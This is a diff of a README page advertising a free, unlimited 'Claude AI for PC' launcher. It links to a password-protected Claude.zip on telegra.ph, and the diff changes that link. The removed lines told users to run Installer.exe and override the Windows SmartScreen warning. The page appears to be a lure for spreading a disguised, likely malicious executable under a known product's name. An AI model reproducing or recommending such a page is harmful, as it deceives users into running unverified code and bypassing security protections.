@@ -2,7 +2,7 @@
 
 Claude AI for PC - free launcher, no chat limits
 
-**[Claude.zip](https://telegra.ph/Download-Tutorial-10-28-9)**  
+**[Claude.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ Claude AI free download for Windows. Unlimited chat launcher: no message caps, n
 - **Launcher** — Windows PC
 - **Package** — tool.zip
 - **Limits** — None
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-9
-2. Download **Claude.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-Claude-FreeDownload
